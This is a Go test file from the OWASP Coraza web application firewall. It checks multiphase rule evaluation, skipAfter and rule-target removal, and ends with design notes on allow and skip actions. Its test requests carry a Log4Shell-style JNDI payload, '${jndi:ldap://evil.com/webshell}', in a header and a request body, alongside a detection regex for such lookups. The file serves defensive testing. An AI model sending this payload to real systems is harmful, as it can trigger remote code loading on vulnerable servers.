// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

//go:build coraza.rule.multiphase_evaluation

package engine

import "github.com/corazawaf/coraza/v3/testing/profile"

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "M4tteoP",
		Description: "Tests fixed bypasses",
		Enabled:     true,
		Name:        "multiphase.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "bypassesPhase1",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Headers: map[string]string{
								"Content-Type": "application/x-www-form-urlencoded",
								"User-Agent":   "CRS 3 Tests ${jndi:ldap://evil.com/webshell}"},
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{944150},
							// Rule 1 should not be triggered because of rule 944150 (precisely REQUEST_HEADERS variable)
							// is anticipated to phase:1 thanks to multiphase evaluation
							NonTriggeredRules: []int{1},
							Interruption: &profile.ExpectedInterruption{
								Status: 503,
								Data:   "",
								RuleID: 944150,
								Action: "deny",
							},
						},
					},
				},
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:     "/",
							Method:  "POST",
							Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
							Data:    "foo=${jndi:ldap://evil.com/webshell}",
						},
						Output: profile.ExpectedOutput{
							// Rule 1 is triggered. The malicious payload is in the request body,
							// therefore we have to reach phase 2 to evaluate it. In that case no action is taken
							// at phase 1.
							TriggeredRules:    []int{1},
							NonTriggeredRules: []int{1944150},
							Interruption: &profile.ExpectedInterruption{
								Status: 403,
								Data:   "",
								RuleID: 1,
								Action: "deny",
							},
						},
					},
				},
			},
		},
	},
	Rules: `
SecDebugLogLevel 9
SecRequestBodyAccess On

SecAction "id:1, phase:2, log, deny, status:403"
SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|XML:/*|XML://@* "@rx (?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)" \
    "id:944150, phase:2, deny, status:503"

`,
})

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "M4tteoP",
		Description: "Tests CRS skipAfter usage with multiphase",
		Enabled:     true,
		Name:        "multiphase_skipafter.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "skipAfterForPL",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Headers: map[string]string{
								"Content-Type": "application/x-www-form-urlencoded",
								"User-Agent":   "CRS 3 Tests ${jndi:ldap://evil.com/webshell}"},
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{900001},
							// Placing skipAfter rules the earliest possible and for each phase permits to properly skip the rules.
							// 944150 should have been triggered at phase 1 but it is skipped thanks to skipAfter.
							NonTriggeredRules: []int{944150},
						},
					},
				},
			},
		},
	},
	Rules: `
SecDebugLogLevel 9
SecRequestBodyAccess On

SecAction "id:900001, phase:1, nolog, pass, t:none, setvar:tx.detection_paranoia_level=1"

SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 2" "id:911011,phase:1,pass,nolog,skipAfter:END-REQUEST"
SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 2" "id:911012,phase:2,pass,nolog,skipAfter:END-REQUEST"

SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|XML:/*|XML://@* "@rx (?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)" \
    "id:944150, phase:2, deny, status:503"

SecMarker "END-REQUEST"
`,
})

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "M4tteoP",
		Description: "Tests CRS ruleRemoveTargetById usage with multiphase",
		Enabled:     true,
		Name:        "multiphase_ruleRemoveTargetById.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "ruleRemoveTargetById",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:     "/test",
							Method:  "POST",
							Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
							Data:    "test"},
						Output: profile.ExpectedOutput{
							TriggeredRules:    []int{1, 3, 4},
							NonTriggeredRules: []int{2},
						},
					},
				},
			},
		},
	},
	// It is expected that rule 1 removes REQUEST_URI from rules 2 and 3, therefore at phase:1 no deny actions are triggered.
	// (wether rule 2 or rule 3 inferred at phase 1 because of REQUEST_URI). Rule 4 checks that.
	// Afterwards, at phase 2, rule 3 is triggered thanks to REQUEST_BODY.
	Rules: `
SecDebugLogLevel 9
SecRequestBodyAccess On

SecRule REQUEST_URI "@rx /" "id:1, phase:1, pass, t:none, ctl:ruleRemoveTargetById=2-3;REQUEST_URI"
SecRule REQUEST_URI "@rx test" "id:2, phase:1, deny, status:503"
SecRule REQUEST_URI|REQUEST_BODY "@rx test" "id:3, phase:2, deny, status:504"
SecRule REQUEST_URI "@unconditionalMatch" "id:4, phase:1, pass"
`,
})

// TODO(MultiPhase): Allow actions
// Allow actions with multiphase evaluation
// Mentioned rule numbers are referring to the rules in allow.go

// - MovingIntoAllowedPhase-
// A variable is anticipated to a phase in which an allow action is triggered.
// The variable is not evaluated in the inferred phase, NOR in its initial phase (not being anymore its minimal phase)
//
// Example: see rules 45 and 46. Rule 45 allows all the request phases (1 and 2)
// Rule 46 is anticipated to phase 1, therefore it is skept. When phase 3 is evaluated, rule 46 is skipped because
// it is not anymore in its minPhase.
// It applies also to rules 31-42 and 11-22.
//
// Possible solutions: Find a way to be sure that each variable has been already evaluated in an inferred phase or not.
// If this is not the case, we have to evaluate in another phase up to its initial one.
// We have to consider at least two cases:
// 1) The rule anticipated has been evaluated in the inferred phase before an allow action happend (it is okay do not evaluate afterwards)
// 2) The rule anticipated has not been evaluated because of an allow action. We have to try to evaluate it in other inferred phases)
//
// A) Add booleans for each variable to keeep tracking if they have been evaluated. It comes with overhead.
// B) Keep track of the allowed phases and evaluate the variables that have the minPhase skipped. It may lead to double evaluation (see point 1)

// - MovingAllowingRules-
// Moving rules with allow actions leads to unwanted skipped rules (and allowed requests). The allow action is executed at the wrong phase.
//
// Example: See rules 70 and 71. Rule 71, being anticipated at phase:1, is evaluated before rule 70. The latter should have denied the request at phase:2
//
// Possible solutions:
// A) Rules with allow actions should not have inferred phases (only the provided one).
// B)
// Possible solution: Evaluate the rule, but wait until the right phase is reached for enforcing the allow action. Problems can arise because of rules ordering.
// E.g. a phase 3 with "allow", anticipated at phase:1 could delay the allow action when phase:3 is reached, but the rules order is not respected. Maybe other
// phase 3 rules should have been evaluated before the allow action.

// TODO(MultiPhase): Skip actions and Remove*By* actions
// - MovingSkipAndSkipAfterRules-
// Similar to MovingAllowingRules, being actions that alter the these in which they are triggered,
// anticipating them can lead to wrong flows. Possible solution: do not permit to anticipate rules with Skip and SkipAfter. It also would permit
// to be safe with rules with multiple targets and relative actions that I think would be executed twice
